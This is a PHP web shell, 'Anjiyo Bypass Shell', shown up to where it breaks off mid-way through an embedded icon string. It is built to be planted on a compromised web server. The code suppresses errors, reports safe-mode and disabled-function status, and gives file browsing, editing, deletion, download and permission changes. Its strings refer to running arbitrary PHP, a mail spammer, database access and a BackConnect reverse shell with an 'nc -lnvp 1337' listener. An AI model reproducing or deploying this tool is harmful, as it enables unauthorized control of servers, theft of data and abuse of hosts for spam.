<?php

set_time_limit(0);
error_reporting(0);
@session_start();
language('en');
if (isset($_GET['hostm']) && isset($_GET['userm'])) {
    $hostm = base64_decode($_GET['hostm']);
    $userm = base64_decode($_GET['userm']);
    $passm = base64_decode($_GET['passm']);
}

if (!function_exists('hex2bin')) {
    function hex2bin($str)
    {
        $bin = '';
        $i = 0;
        while ($i < strlen($str)) {
            $bin .= chr(hexdec($str[$i] . $str[($i + 1)]));
            $i += 2;
        }
    
        return $bin;
    }    
}

function language($lang)
{
    global $lenguaje;
    if ('esp' == $lang) {
        $lenguaje = [0 => 'ON (G�venli)', 1 => 'OFF (G�venlikler kapal�)', 2 => 'Yok', 3 => 'Dosya', 4 => 'Tipi', 5 => 'Dosya boyutu', 6 => 'Chmod izinleri', 7 => '��lemler', 8 => 'Enlace', 9 => 'Crear Carpeta', 10 => 'Crear Archivo', 11 => 'Klas�r', 12 => 'Ar�iv', 13 => 'Sil', 14 => 'Descargar', 15 => 'Editar', 16 => 'No se puede abrir el directorio,  lo siento.', 17 => 'Onayla', 18 => 'Ejecutar!', 19 => 'Kullan�c�:', 20 => '�ifre', 21 => 'Entrar!', 22 => 'List Tablas', 23 => 'Borrar', 24 => 'Descargar', 25 => 'Volver atras', 26 => 'Datos', 27 => 'Lo siento,  no se pueden listar las tablas de la db seleccionada.', 28 => 'Entrar!', 29 => 'Campo', 30 => 'Tipo', 31 => 'Nulo', 32 => 'Llave', 33 => 'Por defecto', 34 => 'Extra', 35 => 'La tabla seleccionada,  no tiene registros.', 36 => 'La base de datos fue borrada correctamente.', 37 => 'No se pudo borrar la base de datos.', 38 => 'Realmente deseas borrar la db', 39 => 'Si', 40 => 'La tabla fue borrada correctamente.', 41 => 'No se pudo borrar la tabla.', 42 => 'Realmente deseas borrar la tabla', 43 => 'Tu email', 44 => 'Lista de emails', 45 => 'Titulo', 46 => 'Contenido HTML', 47 => 'Conectando', 48 => 'Si no tienes habilitados los iframes,  has clic ', 49 => 'aqui', 50 => 'Conectar', 51 => '( Debes ejecutar en tu pc: <b>nc -lnvp 1337</b>,  y tener el puerto abierto :) )', 52 => 'Server ip', 53 => 'Kendi ipin', 54 => 'SI', 55 => 'NO', 56 => 'Disable Functions', 57 => 'Iniciox', 58 => 'Codigo PHP', 59 => 'Conexion Reversa', 60 => 'Dosyay� d�zenleyebilirsiniz', 61 => 'Archivo Guardado Correctamente!', 62 => 'Lo siento,  no se ha podido guardar el archivo.', 63 => 'Php kodunu enjekte et', 64 => 'Error subiendo archivo', 65 => 'No se puede copiar ', 66 => 'al dir', 67 => 'Archivo Subido correctamente', 68 => 'Carpeta Borrada', 69 => 'Archivo Borrado', 70 => 'Carpeta Creada', 71 => 'Nombre de la carpeta', 72 => 'Crear DIR!', 73 => 'Archivo Creado', 74 => 'Nombre del archivo', 75 => 'Crear Archivo!', 76 => 'Lo siento,  no se puede descargar el archivo', 77 => 'Volver Atras', 78 => 'Logueado correctamente', 79 => 'Listar DBS', 80 => 'Salir', 81 => 'Login Incorrecto.', 82 => 'Spammeado correctamente', 83 => 'No fue spammeado', 84 => 'Subir Archivos', 85 => 'Utilidades', 86 => 'Estas seguro que deseas borrar los siguientes archivos/carpetas?', 87 => 'Estas seguro que deseas borrar el siguiente archivo:', 88 => 'Estas seguro que deseas borrar la siguiente carpeta:', 89 => 'Lo siento, no se pueden leer los permisos', 90 => 'CHMOD Cambiado', 91 => 'Error al cambiar el CHMOD', 92 => 'Caracter Inv&aacute;lido', 93 => 'Yeni permisyon', 94 => 'Nuevos permisos', 95 => '�zg�n�m se�ti�in dosya de�il', 96 => 'Hatal� link'];
    } else {
        $lenguaje = [0 => 'ON (Secure)', 1 => 'OFF (Not Secure)', 2 => 'Havent', 3 => 'Name', 4 => 'Type', 5 => 'Size', 6 => 'Perms', 7 => 'Options', 8 => 'Link', 9 => 'Make folder', 10 => 'Make file', 11 => 'Folder', 12 => 'File', 13 => 'Delete', 14 => 'Download', 15 => 'Edit', 16 => 'Unable to open the directory,  sorry.', 17 => 'Send', 18 => 'RUN!', 19 => 'User:', 20 => 'Password:', 21 => 'Login!', 22 => 'List Tables', 23 => 'De�ete', 24 => 'Download', 25 => 'Go back', 26 => 'Data', 27 => 'Lo siento,  no se pueden listar las tablas de la db seleccionada.', 28 => 'Login!', 29 => 'Campo', 30 => 'Type', 31 => 'Null', 32 => 'Key', 33 => 'Default', 34 => 'Extra', 35 => 'The selected table has no records.', 36 => 'The database was deleted successfully.', 37 => 'Could not delete the database.', 38 => 'I really want to delete the database', 39 => 'Yes', 40 => 'The table was deleted successfully.', 41 => 'Could not delete the table.', 42 => 'I really want to clear the table', 43 => 'Your email', 44 => 'MailList', 45 => 'Title', 46 => 'Content HTML', 47 => 'Connecting', 48 => 'If you do not have iframes enabled,  you click', 49 => 'HERE', 50 => 'Connect', 51 => '( You run on your pc: <b>nc -lnvp 1337</b>,  and have the port open :) )', 52 => 'IP of server', 53 => 'Your IP', 54 => 'ON', 55 => 'OFF', 56 => 'Disabled Functions', 57 => 'Index', 58 => 'PHP RUN', 59 => 'BackConnect', 60 => 'If the type of function used to visualize the file does not work,  you try to open the file with', 61 => 'File saved successfully!', 62 => 'Sorry,  could not save the file.', 63 => 'Running PHP code (not write the php tags!)', 64 => 'Error uploading file', 65 => 'Cant copy', 66 => 'in the directory', 67 => 'File saved successfully', 68 => 'Folder deleted', 69 => 'File Deleted', 70 => 'Folder Maked', 71 => 'Name folder', 72 => 'Make Dir!', 73 => 'File created', 74 => 'Name file', 75 => 'Make File!', 76 => 'Sorry, you cant download the file', 77 => 'Go back', 78 => 'Logged correctly', 79 => 'List databases', 80 => 'Exit', 81 => 'Login Incorrect.', 82 => 'Spammed correctly', 83 => 'Was not spammed', 84 => 'Upload Files', 85 => 'Utilities', 86 => 'Are you sure you want to delete the following files / folders ?', 87 => 'Are you sure you want to delete the following file:', 88 => 'Are you sure you want to delete the following folder:', 89 => 'Sorry, can not be read permissions', 90 => 'CHMOD changed', 91 => 'Failed to change the CHMOD', 92 => 'Invalid Character', 93 => 'Current Permits', 94 => 'New Permits', 95 => 'I\'m sorry, you did not select files', 96 => 'Invalid link'];
    }
}
function css()
{
    echo '<style>
body{
    font-family: "Verdana", cursive;
    background-color: #00bf5f;
    text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
    background-color: #636263;
    text-shadow:0px 0px 10px #fff;
}
#content .first{
    background-color: silver;
}
#content .first:hover{
    background-color: silver;
    text-shadow:0px 0px 1px #757575;
}
table{
    border: 0px #dbdbdb;
}
H1{
    font-family: "Rye", cursive;
}
a{
    color: #FF0000;
    text-decoration: none;
}
a:hover{
    color: #fff;
    text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
    border: 1px #000000 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}
</style> ';
}
function header_index()
{
    global $lenguaje;
    echo '<title>' . $_SERVER['HTTP_HOST'] . ' - Anjiyo.php Bypass Shell v 1 // Coded by MecTruy</title><div align="center">
	 <span class="Logo"><img src="http://sellukaweb.com/logoz.png"><br><font color="white"><b>Anjiyo Bypass Shell</b></font></span><br /><br />
	 <table style="Border-Collapse: collapse" cellSpacing="0" borderColorDark="#666666" cellPadding="0" width="100%" bgColor="#4a494a" borderColorLight="#c0c0c0" border="3">
	 <tr valign="top">
	 <td><b>System</b>: <font color="red">' . php_uname() . '</font><br/>
	 <b>Soft</b>: <font color="red">' . $_SERVER['SERVER_SOFTWARE'] . '</font> | <a href="?id=phpinfo">PHPINFO</a><br /> 
	 <b>Safe-Mode</b>: ';
    if (strtolower(ini_get('safe_mode')) or 'on' == ini_get('safe_mode')) {
        echo '<font color=red>' . $lenguaje[0] . '</font>';
    } else {
        echo '<font color=green>' . $lenguaje[1] . '</font>';
    }
    echo '<br />
<b>Open base dir</b>: ';
    if (strtolower(ini_get('open_basedir')) or 'on' == ini_get('open_basedir')) {
        echo '<font color=red>' . ini_get('open_basedir') . '</font>';
    } else {
        echo '<font color=green>' . $lenguaje[1] . '</font>';
    }
    echo '<br />';
    exp_dirs();
    echo '</td>
	 </tr>
	 </table><br />';
}
function ver_tam($tam)
{
    if (!is_numeric($tam)) {
        return false;
    } else {
        if ($tam >= 1073741824) {
            $tam = round($tam / 1073741824 * 100) / 100 . ' GB';
        } elseif ($tam >= 1048576) {
            $tam = round($tam / 1048576 * 100) / 100 . ' MB';
        } elseif ($tam >= 1024) {
            $tam = round($tam / 1024 * 100) / 100 . ' KB';
        } else {
            $tam = $tam . ' B';
        }

        return $tam;
    }
}
function disable_functions()
{
    global $lenguaje;
    if ($disablefunc = ini_get('disable_functions')) {
        return '<font color=#FF9900><b>' . $disablefunc . '</b></font>';
    } else {
        return '<font color=#00FF00><b>' . $lenguaje[2] . '</b></font>';
    }
}
function buffer_exec($buffer)
{
    global $Sonu�;
    $Sonu� = htmlspecialchars(ob_get_contents());
}
function exp_dirs()
{
    global $dir;
    if ('' == trim($dir)) {
        $dir = @getcwd();
    } elseif ('' == !trim($dir)) {
        $dir = @realpath($dir);
    }
    if (DIRECTORY_SEPARATOR != substr($dir, -1)) {
        $dir .= DIRECTORY_SEPARATOR;
    }
    $pd = $e = explode(DIRECTORY_SEPARATOR, substr($dir, 0, -1));
    $i = 0;
    echo '<b>Dir</b>: ';
    foreach ($pd as $b) {
        $t = '';
        $j = 0;
        foreach ($e as $r) {
            $t .= $r . DIRECTORY_SEPARATOR;
            if ($j == $i) {
                break;
            }
            ++$j;
        }
        echo '<a href="?id=dir&d=' . urlencode($t) . '"><b>' . htmlspecialchars($b) . DIRECTORY_SEPARATOR . '</b></a>';
        ++$i;
    }
}
function ver_permisos($modo)
{
    if (0xC000 === ($modo & 0xC000)) {
        $tipo = 's';
    } elseif (0x4000 === ($modo & 0x4000)) {
        $tipo = 'd';
    } elseif (0xA000 === ($modo & 0xA000)) {
        $tipo = 'l';
    } elseif (0x8000 === ($modo & 0x8000)) {
        $tipo = '-';
    } elseif (0x6000 === ($modo & 0x6000)) {
        $tipo = 'b';
    } elseif (0x2000 === ($modo & 0x2000)) {
        $tipo = 'c';
    } elseif (0x1000 === ($modo & 0x1000)) {
        $tipo = 'p';
    } else {
        $tipo = '?';
    }
    $prop['read'] = ($modo & 00400) ? 'r' : '-';
    $prop['write'] = ($modo & 00200) ? 'w' : '-';
    $prop['execute'] = ($modo & 00100) ? 'x' : '-';
    $group['read'] = ($modo & 00040) ? 'r' : '-';
    $group['write'] = ($modo & 00020) ? 'w' : '-';
    $group['execute'] = ($modo & 00010) ? 'x' : '-';
    $world['read'] = ($modo & 00004) ? 'r' : '-';
    $world['write'] = ($modo & 00002) ? 'w' : '-';
    $world['execute'] = ($modo & 00001) ? 'x' : '-';

    return $tipo . join($prop) . join($group) . join($world);
}
function ver_permisos_color($file_color)
{
    global $dir;
    if (!is_readable($file_color)) {
        return '<a href="?id=pwn_chmod&pwnd=' . $file_color . '&d=' . $dir . '" style="color: red;">' . ver_permisos(fileperms($file_color)) . '</a>';
    } elseif (!is_writable($file_color)) {
        return '<a href="?id=pwn_chmod&pwnd=' . $file_color . '&d=' . $dir . '" style="color: white;">' . ver_permisos(fileperms($file_color)) . '</a>';
    } else {
        return '<a href="?id=pwn_chmod&pwnd=' . $file_color . '&d=' . $dir . '" style="color: green;">' . ver_permisos(fileperms($file_color)) . '</a>';
    }
}
function listar_archivos($dir)
{
    global $lenguaje;
    if ($dh = @dir($dir)) {
        while ($file = $dh->read()) {
            if (('.' == $file) or ('..' == $file)) {
                $links_ls[] = $file;
            } elseif (is_dir($dir . '/' . $file)) {
                $dirs_ls[] = $file;
            } else {
                $archivos_ls[] = $file;
            }
        }
        echo '<form action="?id=checkbox_form&d=' . $dir . '" method="post">
			<input type="hidden" name="dir" value="' . $dir . '">
			<table style="Border-Collapse: collapse" cellSpacing=0 borderColor=#5a5a5a cellPadding=1 width="100%" bgColor=#f6f2f2 borderColorLight=#5a5a5a border=1 valign="middle">
			<tr>
			<td align="center"><b>-</b></td>
			<td><b>' . $lenguaje[3] . '</b></td>
			<td><b>' . $lenguaje[4] . '</b></td>
			<td><b>' . $lenguaje[5] . '</b></td>
			<td><b>' . $lenguaje[6] . '</b></td>
			<td><b>' . $lenguaje[7] . '</b></td>
			<td width="16" align="left">OP</td>
			</tr>';
        $color = 0;
        if (isset($links_ls)) {
            foreach ($links_ls as $links) {
                if ('..' == $links) {
                    echo '<tr ';
                    if (!$color) {
                        echo 'bgcolor="#333333"';
                        $color = 1;
                    } else {
                        $color = 0;
                    }
                    echo '>
					 <td width="16" align="center"><img src="?id=icono&tipo=link"></td>
					 <td><a href="?id=dir&d=' . realpath($dir . '/..') . '">' . $links . '</a></td>
					 <td>' . $lenguaje[8] . '</td>
					 <td>---</td>
					 <td>' . ver_permisos_color(realpath($dir . '/..')) . '</td>
					 <td>---</td>
					 <td>--</td>
					 </tr>';
                } elseif ('.' == $links) {
                    echo '<tr ';
                    if (!$color) {
                        echo 'bgcolor="#333333"';
                        $color_nm = '#333333';
                        $color = 1;
                    } else {
                        $color_nm = '#2f2f2f';
                        $color = 0;
                    }
                    echo '>
					 <td width="16" align="center"><img src="?id=icono&tipo=carpeta"></td>
					 <td><a href="?id=dir&d=' . realpath($dir . '/.') . '">' . $links . '</a></td>
					 <td>' . $lenguaje[8] . '</td>
					 <td>---</td>
					 <td>' . ver_permisos_color(realpath($dir . '/.')) . '</td>
					 <td><a href="?id=mkdir&d=' . realpath($dir . '/') . '" style="border:none; color:' . $color_nm . ';"><img src="?id=icono&tipo=agregar_carpeta"></a><a href="?id=mkfile&d=' . realpath($dir . '/') . '" style="border:none; color:' . $color_nm . ';"><img src="?id=icono&tipo=agregar_archivo"></a></td>
					 <td>--</td>
					 </tr>';
                }
            }
        }
        if (isset($dirs_ls)) {
            asort($dirs_ls);
            foreach ($dirs_ls as $dirs) {
                echo '<tr ';
                if (!$color) {
                    echo 'bgcolor="#d6d6d6"';
                    $color_nm = '#333333';
                    $color = 1;
                } else {
                    $color_nm = '#2f2f2f';
                    $color = 0;
                }
                echo '>
					 <td width="16" align="center"><img src="?id=icono&tipo=carpeta"></td>
					 <td><a href="?id=dir&d=' . realpath($dir . '/' . $dirs) . '">' . $dirs . '</a></td>
					 <td>' . $lenguaje[11] . '</td>
					 <td>---</td>
					 <td>' . ver_permisos_color(realpath($dir . '/' . $dirs)) . '</td>
					 <td><a href="?id=rmdir&d1r=' . realpath($dir . '/' . $dirs) . '&d=' . realpath($dir . '/') . '" style="border:none; color:' . $color_nm . ';"><img src="?id=icono&tipo=borrar"></a></td>
					 <td><input type="checkbox" name="directorios[]" value="' . $dirs . '"></td>
					 </tr>';
            }
        }
        if (isset($archivos_ls)) {
            asort($archivos_ls);
            foreach ($archivos_ls as $archivo) {
                echo '<tr ';
                if (!$color) {
                    echo 'bgcolor="#d6d6d6"';
                    $color_nm = '#333333';
                    $color = 1;
                } else {
                    $color_nm = '#2f2f2f';
                    $color = 0;
                }
                echo ' valign="top" height="5">
					 <td width="16" align="center"><img src="?id=icono&tipo=archivo"></td>
					 <td><a href="?id=a_edit&d=' . realpath($dir . '/') . '&a=' . $archivo . '&w=ZnJlYWQ=">' . $archivo . '</a></td>
					 <td>' . $lenguaje[12] . '</td>
					 <td>' . ver_tam(filesize(realpath($dir . '/' . $archivo))) . '</td>
					 <td>' . ver_permisos_color(realpath($dir . '/' . $archivo)) . '</td>
					 <td>
					 <a href="?id=rm_file&fil3=' . realpath($dir . '/' . $archivo) . '&d=' . realpath($dir . '/') . '" style="border:none; color:' . $color_nm . ';"><img src="?id=icono&tipo=borrar"></a> 
					 <a href="?id=fdown&fil3_down=' . $archivo . '&fil3_path=' . realpath($dir . '/' . $archivo) . '&d=' . realpath($dir . '/') . '" style="border:none; color:' . $color_nm . ';"><img src="?id=icono&tipo=descargar"></a>  
					 <a href="?id=a_edit&d=' . realpath($dir . '/') . '&a=' . $archivo . '&w=ZnJlYWQ=" style="border:none; color:' . $color_nm . ';"><img src="?id=icono&tipo=editar"></a></td>
					 <td><input type="checkbox" name="archivos[]" value="' . $archivo . '"></td>
					 </tr>';
            }
        }
        echo '</table>';
        echo '<div align="right"><br />
			<input type="submit" value="OK" />
			<select name="menu_dirs" style="border:none; color:#F00; font-size:12px">
			<option value="borrar">' . $lenguaje[13] . '</option>
			</select>
			</div>
			</form>';
    } else {
        echo $lenguaje[16];
    }
}
function mostrar_iconos($icono)
{
    if ('carpeta' == $icono) {
        $mostrar_icono = 'R0lGODlhEAAQAPcAAP//////zP//mf//Zv//M///AP/M///MzP/Mmf/MZv/MM//MAP+Z//+ZzP+Zmf+ZZv+ZM/+ZAP9m//9mzP9mmf9mZv9mM/9mAP8z//8zzP8zmf8zZv8zM/8zAP8A//8AzP8Amf8AZv8AM/8AAMz//8z/zMz/mcz/Zsz/M8z/AMzM/8zMzMzMmczMZszMM8zMAMyZ/8yZzMyZmcyZZsyZM8yZAMxm/8xmzMxmmcxmZsxmM8xmAMwz/8wzzMwzmcwzZswzM8wzAMwA/8wAzMwAmcwAZswAM8wAAJn//5n/zJn/mZn/Zpn/M5n/AJnM/5nMzJnMmZnMZpnMM5nMAJmZ/5mZzJmZmZmZZpmZM5mZAJlm/5lmzJlmmZlmZplmM5lmAJkz/5kzzJkzmZkzZpkzM5kzAJkA/5kAzJkAmZkAZpkAM5kAAGb//2b/zGb/mWb/Zmb/M2b/AGbM/2bMzGbMmWbMZmbMM2bMAGaZ/2aZzGaZmWaZZmaZM2aZAGZm/2ZmzGZmmWZmZmZmM2ZmAGYz/2YzzGYzmWYzZmYzM2YzAGYA/2YAzGYAmWYAZmYAM2YAADP//zP/zDP/mTP/ZjP/MzP/ADPM/zPMzDPMmTPMZjPMMzPMADOZ/zOZzDOZmTOZZjOZMzOZADNm/zNmzDNmmTNmZjNmMzNmADMz/zMzzDMzmTMzZjMzMzMzADMA/zMAzDMAmTMAZjMAMzMAAAD//wD/zAD/mQD/ZgD/MwD/AADM/wDMzADMmQDMZgDMMwDMAACZ/wCZzACZmQCZZgCZMwCZAABm/wBmzABmmQBmZgBmMwBmAAAz/wAzzAAzmQAzZgAzMwAzAAAA/wAAzAAAmQAAZgAAMwAAAP//lP//nP//9//3jP/3nP/3pf/vhP/ne//nhL2eMbWOGN62Of/fe5x5GN62Qt62Sv/Xa6V5EOe+UvfXhP/PYwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAAEAAQAAAIhgCvCRxIsKDBgwbDKQyHcGA4ABC1MUT4MJvFbADEadSYziG3bSBBQhzZUWA4b+A2qlx5LRw5cQC0yZQ5cp02ceXCoRN3MVu3nuyy4QzHjie2o0ixbVMnNGfRbOCiSgXn7Vy3oU+/ad36jZy5pkR5ohtLduw4bjivrVy7sZzAcnDjyo3bEGFAADs=';
    } elseif ('link' == $icono) {
        $mostrar_icono = 'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAABIAAAASABGyWs+AAACOklEQVQ4y8VTS2gTYRCe+XezzbbNsylNmqDFxkZjoF6Mj0SQGhNQUIqgHuoDDxU8exBFBKleRL1IwYMXUUEPHooUBKNSFJvQUqvGEIU0jzZ1NzHpI41Juru/hxqMxZMVnOPMfN83zMyHlFJYS5A1of8FAbs6IUkSpFMpXTyZMkuyrDIZDfkue6eo0eqk+r7PsZieMIz8G4EgCPzd+499b2KCr8oZ2pBRMVBeKJrVlcjRgGd4n68nynEc/RSNtp2/fO3EyWO9w1hb4mwm03jp+uCpJNr8equdJYQoP2tYXlrEpdT7vH9LyyN3t/PDnSev+tPz0sZzh7dfQUopLC9XYeDG4JHXQkOfulmPUrmosLyW8FoDEEQKAJQCkELi4/eyODXX4tpjKYmJ4tm9nQMsAEAoPNbxMpI50MTzM25LNbh+k1mMxdMd775EPWy7q53X6AEpVQwdLjVd57QwrIqWBAoAiKyiyPD0+YiXrSzMXTxz6JZn184EEgKyLI2Mj0+8uP1gqO9btWtHk9FMEACQEAp1v0NEMdsYDo1uON3b89Dr9SSQrFyWYVhwu7dNH9zdPVSYmlz847shAJtMJltNzQ2Z/QHfxOr629GQ7d6zseOtTo+OEPJLmBAAXBFis9msOhDwTxqNxmo9OBwKmS9cvdmvWLY6+MLXaiU/W1NFRAbKhYyEaKcYDAYtVqu15HA45usJIpGIKTU9Y2NVHK2dE2tzAwAiVVzOzXHM5XKMRqNROI77K1fhf3fjD83C6LLhE0Y7AAAAInpUWHRTb2Z0d2FyZQAAeNorLy/Xy8zLLk5OLEjVyy9KBwA22AZYEFPKXAAAAABJRU5ErkJggg==';
    } elseif ('archivo' == $icono) {
        $mostrar_icono = 'R0lGODlhEAAQAPcAAP//////zP//mf//Zv//M///AP/M///MzP/Mmf/MZv/MM//MAP+Z//+ZzP+Zmf+ZZv+ZM/+ZAP9m//9mzP9mmf9mZv9mM/9mAP8z//8zzP8zmf8zZv8zM/8zAP8A//8AzP8Amf8AZv8AM/8AAMz//8z/zMz/mcz/Zsz/M8z/AMzM/8zMzMzMmczMZszMM8zMAMyZ/8yZzMyZmcyZZsyZM8yZAMxm/8xmzMxmmcxmZsxmM8xmAMwz/8wzzMwzmcwzZswzM8wzAMwA/8wAzMwAmcwAZswAM8wAAJn//5n/zJn/mZn/Zpn/M5n/AJnM/5nMzJnMmZnMZpnMM5nMAJmZ/5mZzJmZmZmZZpmZM5mZAJlm/5lmzJlmmZlmZplmM5lmAJkz/5kzzJkzmZkzZpkzM5kzAJkA/5kAzJkAmZkAZpkAM5kAAGb//2b/zGb/mWb/Zmb/M2b/AGbM/2bMzGbMmWbMZmbMM2bMAGaZ/2aZzGaZmWaZZmaZM2aZAGZm/2ZmzGZmmWZmZmZmM2ZmAGYz/2YzzGYzmWYzZmYzM2YzAGYA/2YAzGYAmWYAZmYAM2YAADP//zP/zDP/mTP/ZjP/MzP/ADPM/zPMzDPMmTPMZjPMMzPMADOZ/zOZzDOZmTOZZjOZMzOZADNm/zNmzDNmmTNmZjNmMzNmADMz/zMzzDMzmTMzZjMzMzMzADMA/zMAzDMAmTMAZjMAMzMAAAD//wD/zAD/mQD/ZgD/MwD/AADM/wDMzADMmQDMZgDMMwDMAACZ/wCZzACZmQCZZgCZMwCZAABm/wBmzABmmQBmZgBmMwBmAAAz/wAzzAAzmQAzZgAzMwAzAAAA/wAAzAAAmQAAZgAAMwAAAFJRUgAAnACGAJyenISGhM7Pzufn1v/PMYQAAAgICAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAAEAAQAAAIfACvcRtIsOC2awgRcvPGsGHDbdgSCgRAsWLFbQAiKrTIESI2jdwAFBwZrhtIkdm+ZVvJMlzGjdxYyszm8mRIjgC81YQJoAA4itJy7pwYEtwIANJoSdP5kijFnwC0aWNq06HDoSHDad3KtelNnBZBdhtLtuxYjR/Tql17LSAAOw==';
    } elseif ('borrar' == $icono) {
        $mostrar_icono = 'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAXUlEQVR42u2SwQoAIAhD88vVLy8KBlaS0i1oJwP3piGVg0Skmpq8HjqZrWl9uwCbGAmwKYGZs/6iqgMyAdJuM8W2QmYKpLt/0AG9ASCv/oAnANd3AEjmAlFT1BypAV+PnRH5YehvAAAAAElFTkSuQmCC';
    } elseif ('editar' == $icono) {
        $mostrar_icono = 'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsSAAALEgHS3X78AAAAB3RJTUUH1gkCDTgyeDqBQAAAAB10RVh0Q29tbWVudABDcmVhdGVkIHdpdGggVGhlIEdJTVDvZCVuAAABp0lEQVQ4y42RvUtbURjGfzfECI0U6eIQFNLFrRCHLkIrWAX/gYLk+oWDQ7OUQkgQ2qEEw8X+AaUgxNh2KIpLQLSCBEHQ4pAttEvNFM29mXJRDpy3Q416c68fD5zhvIf39z7vcwyuNZy3cvvcr7FMevGnr5q3cqK19h2llCilxHVdUUpJ3spJ3sq9aveFOkGO42DbNnbDptFo4DQdfh0dsbVdon5a593bNMBOG+IDiAgigkbQIogW4k/jNJtNoo+i1E/rmMkZgB2AsA+ghZXCF09t2pyjJ/qYjc0fuK5Lq9W6evMBtGhmpuYBgUsXWjSJxBAnJ3+JRCL0fH4JwLiJGQ5aoVBcufULxiuLDGag+/cLKuvlYiBgKjmLICD/722dZfuvmi8Oy9ySgab4rXDn5IvDMtUaAO8DMhCSk9OeWufkag3+9I3y+tPux3DQnl+/r3qn420eWFhl+6AG7BqBgJsOzrL9DK3BG3XOfBf0pko8eT4BB0vBGXQ6yKzBsQm9qQ90xZ55wgbkXgedebRlGEawg1gsxkOktfYB9qzlpREeqFAotAfwD53h3AFtQ/QoAAAAAElFTkSuQmCC';
    } elseif ('descargar' == $icono) {
        $mostrar_icono = 'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAANkE3LLaAgAAAoFJREFUeJx1kstL1FEYhp9zzsw45VxSs5Fuk8NITldqMCWKIDCQiogW0UKoDCKCWrUOoj+gVYsocNGiRWBEi6A2CQXahJV2WdSgdNGiJh3NnzO/c2mhjZL2rc7ifR/e872fYIlJH01f3X9sf6ee0VMCgQqryOO7j2/l7+Wv/KsNLAVINTZmujpOrdeeDwJUOMhwLt+UJ79IuyRg2vzSH6cGMZ7BAQGtmBbjZimtWvCWbeeyNzP70scbdsR2xxpCcc+N4zHOpCkw7Sbiq1NrW+q31x38nBt9ALhFCULN5fa9h7PrjO9RcB8IBiUAvnaksisbk7tk45MHuZG/5kWATi8z3P+qt97f4sLxQIyIWIF1mh+M8b00SmSw2jtd3vPpGe8Xf+FEe/Ptg61Nh6rfI/WMJyKp1axZniYarAXrk+iTtLxLy6aGug2ZVCL1qO9DTwVw+dKZqx3ZVR0DAy9qvn7+JnhTxo0Itmw+QKxUz5cbz7G9RX4WCvLr6BfasptSieTWxNP+1w8DAL8nJ5sS1SI1EqlhWbQWJSR+0THWk8M5qJuKUJWO4pxFOkNUlKLC2UxlB8boeFAb9rVuxvkeQkhAYLSPEALZkATncA4sIEtFgk7GKgCrjRZYVm5s5VH3NRz2n7YFAF7ZcqTrIt9z95kpq1IF4CQ+QoKqAhViZ3brAnOlMQZeDEEoPJfEzgOEFT5qtnNjDK8GhnAVo6gAjJk9RhkIYayeBxhEGTl7EkoptjUnsdYgpcLaOZNSvHw7AoDWGmdZkEBILQWApf3kBf437S0OEKhQECtMqZIvHCZ59vjh60gZcDgnhQQxF93N78ACdfFIdaFQLHbfuX9+osTwHy4bB5h5T+YrAAAAAElFTkSuQmCC';
    } elseif ('agregar_archivo' == $icono) {
        $mostrar_icono = 'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAWdJREFUeNqkUz1rg1AUvUr3jIEKmkxdav6Bq4hDELpkz/7GLP4Dx/wJs9ShlKBZ8xe6dMpWUggkEMSE+NF3hGfV2rS0Fy7vvofn3HOu70lFUdB/4qbr0PO8a6wPs9ks+JZAgC3LotFo1EX+yBdJ7OU2GEARSZJQHMd0PB7pcDh0ypHbYN71WZxlWdZIxGQywTLnOUQhYYhtz4qivOu63tc0jfI8L8FYF4sFLZdLMgzjzXVdBQ2rGdSl8+gPBgNK07RSAgKA7+b3tGbrW5yHYfhJgIHBKz5EXi6XCuj7PkVR1PDOGxZQ0vgLAlCXjQQYnUWIGko6CergXq9HpmnSiq0q8Ct7KWsokNsE8C2mjnq/39N0OqUgCBoWuH8Jg2wQtMFYz+czbbdbOp1OZNt22R2dxeB/tCByt9sRY4wcxyFVVXEbh1zF5qoFkSCAAgTuAg/Gc/PlLeDf//U1jvltfPolZlzffAgwAMubE3kVfrHwAAAAAElFTkSuQmCC';
    } elseif ('agregar_carpeta' == $icono) {
        $mostrar_icono = 'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAqZJREFUeNqMUltIFFEY/v45Z3bd1Wy9BaVpKlkSaiRivXaxoCBCEuwhgqDsISoxkCAIeiojeiixXoTowbLLQ9CD9GohorimSGKTLqWZYnnZNfcyp//MeCMK+pl/Zs5/vv/+UX/LgR92PBpQdgJayBAgIb8SGYf55NUmrAg5jwRR14pZaueyulYgFndBQqD3/qlsDjJAtOa7GoMTGNKcIkNucgIo22bnJUSHm6AUwcyuxp66J4BBq1ndl3I/0kSw+XSWMEUFV9ItHZAK84WP7wXik29WwboC4kDk/GugDaPwCl8rDIVmo8V5Ae5HIxMRLovbJbHWMn8MYeBz90fMhCb4qJwARLWMlSja7O3jub1yA+AXhEcHkE4qt2qC1TWIlIAXhce5JXt5RiutmB4EW86ekE5tIorRnmFMW1/Wjwt55duRnpOBmHUPpNSyVcHw5SAqdmA2Eu+SZBhYmrAQXZhHRX0bZ+J1KnLaSYSauV0DkjE8dd2TG3tDMSKDgxifirVJ3jfmJsaQmrMTiFiwpzt0DicXiSQI7Sh8aB14ivZPvU717IIqbx4uNY09FheOFdyAiiOzqASml1eKRR5FEquHh+UBPH52fob3P3uwvxw4s68BKWnvMBSZxbYj8Bt6TfPfJuHP38rgJVBKgHWjo0jWmobnI90ozQfCvO3SjCaEI8C